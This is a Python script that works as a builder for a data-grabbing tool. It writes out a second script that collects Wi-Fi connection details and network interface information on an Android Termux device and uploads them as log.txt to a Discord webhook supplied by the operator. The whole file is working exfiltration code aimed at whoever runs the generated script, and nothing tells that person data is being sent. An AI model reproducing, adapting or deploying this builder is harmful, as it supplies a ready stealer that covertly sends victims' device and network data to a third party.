import os

def print_header():
    header = """
███████▄      ▀█████████▄  ███    █▄   ▄█   ▄█       ████████▄  
██▀     ▄██       ███    ███ ███    ███ ███  ███       ███   ▀███ 
      ▄███▀       ███    ███ ███    ███ ███▌ ███       ███    ███ 
 ▀█▀▄███▀▄▄      ▄███▄▄▄██▀  ███    ███ ███▌ ███       ███    ███ 
  ▄███▀   ▀     ▀▀███▀▀▀██▄  ███    ███ ███▌ ███       ███    ███ 
▄███▀             ███    ██▄ ███    ███ ███  ███       ███    ███ 
███▄     ▄█       ███    ███ ███    ███ ███  ███▌    ▄ ███   ▄███ 
 ▀████████▀     ▄█████████▀  ████████▀  █▀   █████▄▄██ ████████▀  
                                              ▀                    
"""
    print(header)

def create_python_script(script_name, webhook_url):
    script_content = f"""import subprocess
import requests

def collect_info():
    info = {{}}

    # WLAN Information (Termux)
    try:
        wlan_info = subprocess.check_output(["termux-wifi-connectioninfo"], text=True)
        info['WLAN Information'] = wlan_info
    except subprocess.CalledProcessError as e:
        info['WLAN Information'] = f"Error collecting WLAN info: {{e}}"

    # Network Information (Termux)
    try:
        network_info = subprocess.check_output(["ip", "addr"], text=True)
        info['Network Information'] = network_info
    except subprocess.CalledProcessError as e:
        info['Network Information'] = f"Error collecting Network info: {{e}}"

    return info

def send_data_to_webhook():
    webhook_url = "{webhook_url}"
    info = collect_info()
    
    # Save collected information to a file
    with open("log.txt", "w", encoding='utf-8') as log_file:
        for section, content in info.items():
            log_file.write(f"\\n================== {{section}} ==================\\n")
            log_file.write(content)
    
    # Send the file to the webhook
    with open("log.txt", "rb") as file:
        files = {{
            "file": ("log.txt", file)
        }}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("Data successfully sent to webhook.")
        else:
            print(f"Failed to send data: {{response.status_code}}")

if __name__ == "__main__":
    send_data_to_webhook()
"""
    with open(script_name, "w") as script_file:
        script_file.write(script_content)

def main():
    print_header()

    script_name = input("Enter name for the generated Python script file (e.g., my_script.py): ")
    webhook_url = input("Enter Discord Webhook URL: ")

    if not script_name:
        print("No name entered.")
        return

    if not webhook_url:
        print("No Webhook URL entered.")
        return

    create_python_script(script_name, webhook_url)
    print(f"Python script '{script_name}' generated successfully.")

if __name__ == "__main__":
    main()
